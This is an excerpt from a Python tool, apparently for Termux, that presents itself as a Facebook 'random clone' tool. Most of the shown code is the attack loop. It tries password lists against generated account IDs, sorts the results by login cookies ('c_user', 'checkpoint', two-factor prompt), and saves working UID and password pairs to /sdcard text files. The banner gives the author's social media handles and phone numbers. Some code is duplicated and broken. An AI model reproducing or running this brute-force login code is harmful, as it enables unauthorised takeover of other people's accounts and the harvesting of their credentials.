...
ha = current.day
today = date.today()
Ovi2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32m MR RAFU      \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mMd Sabbir Hossain Rafi \033[1;31m     │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32mr rafu-0878           \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+923155912839             \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32m2.0                     \033[1;31m   │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m MR RAFU              \033[1;31m   │
\033[1;37m╚ⒽⒷⒻFACEBOOK TRICKS AND HELPING ZONE{ HBF }\033[1;37mⒽⒷⒻ╝
\033[1;91m==========================================================
\033[31;44m EVERYONE THINKS OF CHANGING THE WORLD     
 BUT NO ONE THINKS OF CHANGING HIMSELF. Hello World It’s RAFI.. 🍂\033[0;m
\033[1;91m=========================================================="""
...
def checks(ok,cp):
    if not len(ok) != 0:
        pass
    if len(cp) != 0:
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mRAFU-OK.txt' % (
            H, P, str(len(ok))))
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mRAFU-CP.txt' %
              (H, P, str(len(cp))))
...
def my_tool_security():
    ...
    print("\t  Fb page  : MR RAFU ")
    print("\t  Github   : rafu-0878")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    if f_token in my_server:
        ...
        print(" otherwise msg on this whatsapp +8801982876336 \n")
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_RAFU_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if Ovi in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/AbRaHaM.Er.AbBu.01");xyz()
    elif Ovi in ["4","04"]:
        os.system("xdg-open https://wa.me/+8801982876336")
        xyz()    
    elif Ovi in ["0","00"]:
       exit()
    else:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio Ovi_OK.mp3")
                print('\r\033[1;32m[Ovi-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/Ovi-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio Ovi_2F.mp3")
                    print('\r\033[1;34m[Ovi-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/Ovi-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio Ovi_CP.mp3")
                    print(f'\r\033[1;30m[Ovi-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/Ovi-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Ovi 🔥] [%s] \33[1;97m[OK:%s{Ovi2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[7:22]
                os.system("play-audio RAFU_OK.mp3")
                print('\r\033[1;32m[RAFU-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/Ovi-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio RAFU_2F.mp3")
                    print('\r\033[1;34m[RAFU-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/RAFU-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio RAFU_CP.mp3")
                    print(f'\r\033[1;30m[RAFU-CP] '+uid+' [×] '+ps+ ' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[RAFU 🔥] [%s] \33[1;97m[OK:%s{RAFU}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio RAFU❤️_CP.mp3")
                    print(f'\r\033[1;30m[RAFU😭-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/Ovi-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
